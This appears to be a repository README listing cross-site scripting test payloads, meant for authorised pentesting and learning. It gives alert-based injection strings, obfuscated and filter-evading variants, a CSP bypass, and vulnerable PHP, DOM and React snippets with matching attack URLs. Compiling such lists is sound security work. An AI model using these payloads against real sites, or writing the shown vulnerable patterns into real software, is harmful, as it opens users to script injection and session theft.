# 🛡️ XSS Payloads Repository

This repository contains a curated list of **Cross-Site Scripting (XSS)** payloads for testing and learning web security. Ideal for bug bounty hunters, pentesters, and security enthusiasts.

⚠️ **Disclaimer**  
- Use these payloads **only** in environments where you have explicit permission.  
- Unauthorized testing is illegal and unethical.

---

## 📚 Table of Contents

1. [Basic Payloads](#basic-payloads)
2. [Obfuscated Payloads](#obfuscated-payloads)
3. [Event Handlers](#event-handlers)
4. [Advanced Techniques](#advanced-techniques)
5. [DOM-Based XSS](#dom-based-xss)
6. [Context-Specific Payloads](#context-specific-payloads)
7. [Bypass Techniques](#bypass-techniques)
8. [Real-World Example Payloads](#real-world-example-payloads)
9. [Contributing](#contributing)

---

## 🧪 Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert('XSS')"></iframe>

🧬 Obfuscated Payloads

<script>eval("al"+"ert(1)")</script>
<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
<iframe src="javascript:alert`XSS`"></iframe>
<svg><script xlink:href=data:,alert(1)></script></svg>

🔘 Event Handlers

<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<div onclick="alert(1)">Click Me</div>
<a href="#" onmouseover=alert(1)>Hover Me</a>

🧠 Advanced Techniques

<details open ontoggle=alert(1)>
<math><mtext></mtext><script>alert(1)</script></math>
<form><button formaction="javascript:alert(1)">CLICK</button></form>
<object data="javascript:alert(1)"></object>
<isindex type=image src=1 onerror=alert(1)>

⚙️ DOM-Based XSS

Used when injection happens in JavaScript code via the DOM.

// If input is injected directly
var user = location.hash;
document.body.innerHTML = user; // vulnerable

Payload:

http://example.com/#<img src=x onerror=alert(1)>

🧩 Context-Specific Payloads
1. HTML Context

<script>alert(1)</script>

2. Attribute Context

<img src=x onerror=alert(1)>
<a href="#" onclick=alert(1)>Click</a>

3. JavaScript Context

';alert(1);//

4. URL Context

javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

CSP Bypasses

<script src="data:text/javascript,alert(1)"></script>

🧨 Real-World Example Payloads
PHP $_GET Injection

echo $_GET["name"];

Payload:

http://vuln.site/?name=<script>alert(1)</script>

React (with improper dangerouslySetInnerHTML)

<div dangerouslySetInnerHTML={{__html: userInput}} />

Payload:

<img src=1 onerror=alert('ReactXSS')>











